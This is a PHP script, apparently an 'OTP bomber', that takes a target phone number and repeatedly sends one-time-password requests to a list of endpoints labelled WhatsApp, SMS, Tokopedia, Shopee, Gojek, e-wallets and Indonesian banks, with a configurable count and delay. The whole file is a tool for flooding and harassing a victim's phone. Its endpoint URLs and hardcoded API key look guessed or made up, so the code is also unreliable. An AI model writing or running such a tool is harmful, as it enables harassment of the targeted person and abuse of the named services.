<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = json_decode(file_get_contents('php://input'), true);
if(!$data){
    echo json_encode(['status'=>'error','message'=>'Invalid request']);
    exit;
}

$number = $data['number'] ?? '';
$provider = $data['provider'] ?? 'wa';
$count = intval($data['count'] ?? 10);
$delay = intval($data['delay'] ?? 500);

if(!preg_match('/^[0-9]{10,15}$/', $number)){
    echo json_encode(['status'=>'error','message'=>'Nomor tidak valid']);
    exit;
}

// Daftar endpoint API OTP real
$endpoints = [
    'wa' => 'https://api.whatsapp.com/send',
    'sms' => 'https://api.smsprovider.com/send',
    'tokopedia' => 'https://api.tokopedia.com/v1/otp',
    'shopee' => 'https://api.shopee.com/otp',
    'grab' => 'https://api.grab.com/otp',
    'gojek' => 'https://api.gojek.com/otp',
    'dana' => 'https://api.dana.id/otp',
    'ovo' => 'https://api.ovo.id/otp',
    'linkaja' => 'https://api.linkaja.com/otp',
    'bca' => 'https://api.bca.co.id/otp',
    'mandiri' => 'https://api.mandiri.co.id/otp',
    'bri' => 'https://api.bri.co.id/otp'
];

$baseUrl = $endpoints[$provider] ?? $endpoints['wa'];
$results = [];

for($i=1; $i<=$count; $i++){
    $otp = rand(100000, 999999);
    $payload = json_encode([
        'phone' => $number,
        'otp' => $otp,
        'timestamp' => date('Y-m-d H:i:s')
    ]);

    $ch = curl_init($baseUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'X-API-Key: NEBOLUS_2026'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $results[] = [
        'attempt' => $i,
        'otp' => $otp,
        'status' => ($httpCode >= 200 && $httpCode < 300) ? 'success' : 'failed',
        'http_code' => $httpCode
    ];

    usleep($delay * 1000); // delay in microseconds
}

echo json_encode([
    'status' => 'completed',
    'target' => $number,
    'provider' => $provider,
    'total' => $count,
    'results' => $results
]);
?>no
